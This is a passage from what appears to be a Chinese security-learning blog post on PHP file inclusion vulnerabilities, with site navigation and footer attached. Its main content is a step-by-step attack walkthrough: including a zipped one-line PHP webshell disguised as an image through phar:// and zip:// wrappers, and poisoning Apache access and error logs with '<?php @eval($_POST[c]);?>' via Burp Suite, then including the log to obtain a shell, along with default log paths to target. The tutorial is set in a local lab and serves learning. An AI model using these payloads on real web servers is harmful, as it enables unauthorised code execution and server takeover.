+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790" alt="img"></p>
+<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
+<li><p>利用条件：php版本大于等于php5.3.0</p>
+</li>
+<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
+<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
+</li>
+<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
+</li>
+</ul>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png" alt=""></p>
+<p>指定绝对路径：</p>
+<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
+<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png" alt=""></p>
+<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
+<li><p>php版本大于等于php5.3.0</p>
+</li>
+<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
+</li>
+<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
+</li>
+<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+</li>
+</ul>
+<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
+<ul>
+<li>1.日志的物理存放路径</li>
+<li>2.存在文件包含漏洞</li>
+</ul>
+<p>获取日志存放路径</p>
+<p>（一）日志默认路径</p>
+<p>(1) apache+Linux日志默认路径</p>
+<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
+<p>或者</p>
+<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
+<p>(2) apache+win2003日志默认路径</p>
+<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
+    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
+<p>(5) nginx 日志文件</p>
+<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
+            以我的安装路径为例/usr/local/nginx,
+            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
+<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
+<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964" alt="img"></p>
+<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195" alt="img"></p>
+<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
+                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
+                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
+<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
+<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889" alt="img"></p>
+<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
+<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
+<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
+<p>客户端连接，获取一句话木马</p>
+<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
+<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
+<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
+<hr>
+<p><strong>参考文章</strong>：<a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
+<p>​                    <a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="tag"># web漏洞学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/03/dc-2-ba-ji-xue-xi/" rel="next" title="DC-2靶机学习">
+                <i class="fa fa-chevron-left"></i> DC-2靶机学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/03/ti-quan-fang-shi-zong-jie/" rel="prev" title="提权方式总结">
+                提权方式总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞相关知识点"><span class="nav-number">1.0.1.</span> <span class="nav-text">文件包含漏洞相关知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是文件包含？"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">什么是文件包含？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件包含函数"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">文件包含函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞产生的原因"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">漏洞产生的原因</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分类"><span class="nav-number">1.0.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">1.0.3.</span> <span class="nav-text">本地文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、无限制本地文件包含漏洞"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">一、无限制本地文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、session文件包含漏洞"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">二、session文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#三、有限制本地文件包含漏洞绕过"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">三、有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">1.0.4.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP伪协议在文件包含中的应用"><span class="nav-number">1.0.5.</span> <span class="nav-text">PHP伪协议在文件包含中的应用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-（读取POST数据）"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input （读取POST数据）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input-命令执行"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">php:&#x2F;&#x2F;input(命令执行)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#data-伪协议"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">data:&#x2F;&#x2F;伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#phar伪协议"><span class="nav-number">1.0.5.5.</span> <span class="nav-text">phar伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#zip：-伪协议"><span class="nav-number">1.0.5.6.</span> <span class="nav-text">zip：&#x2F;&#x2F;伪协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#包含日志文件"><span class="nav-number">1.1.</span> <span class="nav-text">包含日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SSH-log"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">SSH log</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#包含临时文件"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">包含临时文件</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shu1L</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
